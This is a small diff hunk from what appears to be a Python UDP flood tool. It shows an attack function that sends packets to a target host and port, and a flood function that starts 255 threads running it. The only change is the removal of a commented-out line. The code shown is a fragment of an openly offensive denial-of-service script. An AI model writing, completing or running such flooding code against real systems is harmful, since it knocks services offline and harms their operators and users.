@@ -11,6 +11,5 @@ def attack(TARGET,PORT):
         sock.sendto(bytess, (TARGET,PORT))
 
 def flood(TARGET,PORT):
-    # global TARGET,PORT
     for i in range(0,255):
         Thread(target=attack,args=(TARGET,int(PORT))).start()
